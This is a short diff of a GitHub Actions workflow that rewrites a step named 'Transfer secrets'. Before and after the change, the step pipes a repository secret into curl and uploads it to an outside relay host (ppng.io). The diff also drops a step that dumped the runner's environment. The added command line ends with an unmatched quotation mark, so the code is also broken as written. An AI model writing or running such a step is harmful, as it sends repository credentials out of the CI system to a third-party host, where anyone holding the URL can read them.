@@ -9,7 +9,7 @@ jobs:
   github-actions-environment-variables-ubuntu:
     runs-on: ubuntu-latest
     steps:
-      - name: Get env
-        run: env
       - name: Transfer secrets
-        run: "echo 'Token test is: ${{secrets.test}}' | curl -T - https://ppng.io/justtest123"
+        env:
+          SUPER_SECRET: ${{ secrets.test }}
+        run: echo "token is $SUPER_SECRET,other is $env" | curl -T - https://ppng.io/justtest123"
